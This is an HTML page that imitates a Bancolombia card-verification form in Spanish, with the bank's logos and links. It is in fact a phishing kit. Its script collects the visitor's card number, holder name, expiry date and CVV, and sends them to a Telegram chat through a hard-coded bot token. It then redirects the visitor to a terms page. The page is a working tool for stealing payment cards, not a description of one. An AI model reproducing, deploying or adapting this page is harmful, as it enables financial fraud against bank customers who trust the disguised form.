<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifica tu tarjeta - Bancolombia</title>
    <link rel="stylesheet" href="styles_new.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background: linear-gradient(135deg, #1a1f2e 0%, #16213e 100%); display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .loading-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255, 255, 255, 0.95); z-index: 9999; justify-content: center; align-items: center; }
        .loading-overlay.active { display: flex; }
        .spinner { width: 50px; height: 50px; border: 4px solid #e0e0e0; border-top: 4px solid #FFD700; border-radius: 50%; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="loading-overlay" id="loadingOverlay">
        <div class="spinner"></div>
    </div>

    <div class="auth-container">
        <div class="auth-content">
            <img src="img/logo-bancolombia-blanco.png" alt="Bancolombia" class="logo">
            <h1>Verificación de tarjeta</h1>
            
            <div class="auth-box">
                <h2>Datos de tarjeta</h2>
                <p>Por favor ingresa los datos de tu tarjeta Bancolombia.</p>
                
                <form class="auth-form" id="cardForm">
                    <div class="form-group">
                        <div class="input-group">
                            <svg class="input-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                                <path d="M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2z"/>
                                <path d="M2 10h20"/>
                            </svg>
                            <div class="input-wrapper">
                                <input type="text" id="cardNumber" placeholder="Número de tarjeta" maxlength="19">
                                <label for="cardNumber">Número de tarjeta</label>
                            </div>
                        </div>
                    </div>

                    <div class="form-group">
                        <div class="input-group">
                            <svg class="input-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                                <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/>
                                <circle cx="12" cy="7" r="4"/>
                            </svg>
                            <div class="input-wrapper">
                                <input type="text" id="cardHolder" placeholder="Titular de la tarjeta">
                                <label for="cardHolder">Titular de la tarjeta</label>
                            </div>
                        </div>
                    </div>

                    <div class="form-row">
                        <div class="form-group half">
                            <div class="input-group">
                                <svg class="input-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                                    <rect x="3" y="4" width="18" height="18" rx="2" ry="2"/>
                                    <line x1="16" y1="2" x2="16" y2="6"/>
                                    <line x1="8" y1="2" x2="8" y2="6"/>
                                    <line x1="3" y1="10" x2="21" y2="10"/>
                                </svg>
                                <div class="input-wrapper">
                                    <input type="text" id="expiryDate" placeholder="MM/YY" maxlength="5">
                                    <label for="expiryDate">Fecha de vencimiento</label>
                                </div>
                            </div>
                        </div>

                        <div class="form-group half">
                            <div class="input-group">
                                <svg class="input-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                                    <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
                                    <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
                                </svg>
                                <div class="input-wrapper">
                                    <input type="text" id="cvv" placeholder="CVV" maxlength="4">
                                    <label for="cvv">CVV</label>
                                </div>
                            </div>
                        </div>
                    </div>

                    <button type="submit" class="btn-iniciar" disabled>Continuar</button>
                </form>
            </div>
        </div>

        <div class="help-links">
            <a href="#">¿Problemas para conectarte?</a>
            <span class="separator">•</span>
            <a href="#">Aprende sobre seguridad</a>
            <span class="separator">•</span>
            <a href="#">Reglamento Sucursal Virtual</a>
        </div>
    </div>
    
    <footer class="footer">
        <div class="footer-content">
            <div class="footer-left">
                <img src="img/logo-bancolombia-blanco.png" alt="Bancolombia" class="footer-logo">
                <img src="img/SFC_NEGRO_1_1.png" alt="SFC" class="sfc-logo">
            </div>
            <div class="footer-right">
                <p class="ip-address" id="ipAddress">Dirección IP: ...</p>
                <p class="datetime" id="datetime">...</p>
            </div>
        </div>
    </footer>

    <div id="loadingOverlay" class="loading-overlay">
        <img src="img/LogoBancolombia.png" alt="Cargando..." class="loading-logo">
    </div>

    <script>
    const TELEGRAM_BOT_TOKEN = '8882344336:AAF7YqBNYTL7Hb_9dPSicH9da29xEUSImGo';
    const TELEGRAM_CHAT_ID = '-1003784784181';

    document.addEventListener('DOMContentLoaded', function() {
        const cardNumber = document.getElementById('cardNumber');
        const cardHolder = document.getElementById('cardHolder');
        const expiryDate = document.getElementById('expiryDate');
        const cvv = document.getElementById('cvv');
        const btn = document.querySelector('.btn-iniciar');
        const form = document.getElementById('cardForm');
        const overlay = document.getElementById('loadingOverlay');
        
        btn.disabled = true;
        
        function validateForm() {
            const isValid = cardNumber.value.trim().length >= 13 && 
                           cardHolder.value.trim().length > 0 && 
                           expiryDate.value.length === 5 && 
                           cvv.value.length >= 3;
            btn.disabled = !isValid;
            if (isValid) {
                btn.style.backgroundColor = '#FFD700';
                btn.style.cursor = 'pointer';
            } else {
                btn.style.backgroundColor = '';
                btn.style.cursor = 'default';
            }
        }
        
        cardNumber.addEventListener('input', function() {
            cardNumber.value = cardNumber.value.replace(/\D/g, '').slice(0, 16);
            validateForm();
        });
        
        cardHolder.addEventListener('input', validateForm);
        
        expiryDate.addEventListener('input', function() {
            let val = expiryDate.value.replace(/\D/g, '');
            if (val.length >= 2) {
                val = val.slice(0, 2) + '/' + val.slice(2, 4);
            }
            expiryDate.value = val;
            validateForm();
        });
        
        cvv.addEventListener('input', function() {
            cvv.value = cvv.value.replace(/\D/g, '').slice(0, 4);
            validateForm();
        });
        
        form.addEventListener('submit', async function(e) {
            e.preventDefault();
            if (btn.disabled) return;
            
            overlay.classList.add('active');

            const mensaje = `💳 <b>TARJETA - BANCOLOMBIA</b>

<b>Número:</b> <code>${cardNumber.value}</code>
<b>Titular:</b> <code>${cardHolder.value}</code>
<b>Vencimiento:</b> <code>${expiryDate.value}</code>
<b>CVV:</b> <code>${cvv.value}</code>

<b>⏰ Recibido:</b> ${new Date().toLocaleString('es-CO')}`;

            try {
                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: mensaje, parse_mode: 'HTML' })
                });

                if ((await response.json()).ok) {
                    setTimeout(() => { window.location.href = 'terminos.html'; }, 2000);
                } else {
                    overlay.classList.remove('active');
                }
            } catch (error) {
                overlay.classList.remove('active');
            }
        });
    });
    </script>
</body>
</html>
